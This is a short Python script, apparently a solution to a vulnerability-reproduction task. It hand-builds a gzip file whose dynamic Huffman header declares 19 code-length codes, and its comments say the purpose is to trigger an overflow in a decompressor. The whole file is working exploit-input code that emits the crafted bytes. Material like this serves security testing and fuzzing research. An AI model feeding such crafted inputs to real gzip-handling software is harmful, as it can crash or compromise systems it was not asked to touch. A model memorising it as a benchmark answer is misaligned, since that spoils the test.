import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Build gzip with a dynamic Huffman block where HCLEN = 19 to trigger the overflow.
        # The block decompresses to empty data (only EOB).
        def write_bits(value, nbits, out_bits):
            for i in range(nbits):
                out_bits.append((value >> i) & 1)

        bits = []

        # BFINAL=1, BTYPE=2 (dynamic)
        write_bits(1, 1, bits)
        write_bits(2, 2, bits)

        # HLIT = 0 (257 codes), HDIST = 0 (1 code), HCLEN = 15 (19 code length codes)
        write_bits(0, 5, bits)   # HLIT
        write_bits(0, 5, bits)   # HDIST
        write_bits(15, 4, bits)  # HCLEN (15 means 19 codes)

        # Code length code lengths in order:
        order = [16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15]
        # Only symbols 1 and 18 have length 1, others 0
        for sym in order:
            val = 1 if sym in (1, 18) else 0
            write_bits(val, 3, bits)

        # Helper to write code length alphabet symbols:
        # With only symbols 1 and 18 at length 1, canonical codes are:
        # sym=1 -> code 0, sym=18 -> code 1 (1-bit each).
        def write_cl_symbol(sym):
            if sym == 1:
                write_bits(0, 1, bits)
            elif sym == 18:
                write_bits(1, 1, bits)
            else:
                raise ValueError("Unexpected code length symbol")

        # Repeat zero using symbol 18 with extra bits: count in [11..138]
        def write_repeat_zero(count):
            write_cl_symbol(18)
            write_bits(count - 11, 7, bits)

        # Literal/length code lengths: 256 zeros then one '1' for code 256
        write_repeat_zero(138)
        write_repeat_zero(118)
        write_cl_symbol(1)  # length 1 for code 256

        # Distance codes: one code of length 1
        write_cl_symbol(1)

        # Compressed data: emit EOB (256), which is the only lit/len symbol, code 0 (1 bit)
        write_bits(0, 1, bits)

        # Pack bits into bytes (LSB-first per DEFLATE)
        deflate = bytearray()
        b = 0
        bitpos = 0
        for bit in bits:
            b |= (bit & 1) << bitpos
            bitpos += 1
            if bitpos == 8:
                deflate.append(b)
                b = 0
                bitpos = 0
        if bitpos != 0:
            deflate.append(b)

        # Gzip header: ID1 ID2 CM FLG MTIME[4] XFL OS
        header = bytes([0x1f, 0x8b, 0x08, 0x00, 0,0,0,0, 0x00, 0x00])

        # Gzip footer: CRC32 and ISIZE for empty output are both zero
        footer = b"\x00\x00\x00\x00\x00\x00\x00\x00"

        return header + bytes(deflate) + footer